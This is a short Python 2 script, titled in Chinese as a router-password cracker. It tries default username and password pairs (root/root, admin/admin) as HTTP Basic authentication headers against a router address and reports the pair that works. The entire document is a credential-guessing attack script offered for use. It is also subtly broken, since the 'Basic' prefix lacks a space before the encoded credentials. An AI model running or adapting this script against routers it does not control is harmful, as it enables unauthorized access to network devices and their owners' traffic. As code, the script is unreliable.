# -*- coding: UTF-8 -*-
'''破解路由器密码
firefox + tamper data
http://www.cnblogs.com/virusdefender/p/3655885.html
'''


import base64
import urllib2
password_dic = [["root","root"],["admin","admin"]]
request = urllib2.Request('http://12.12.12.1')

for item in password_dic:
    psw_base64 = "Basic" + base64.b64encode(item[0]+":"+ item[1])
    request.add_header('Authorization',psw_base64)
    try:
        response = urllib2.urlopen(request)
        print "correct! username:%s,pwd:%s"%(item[0],item[1])
        break
    except urllib2.HTTPError:
        print "error"
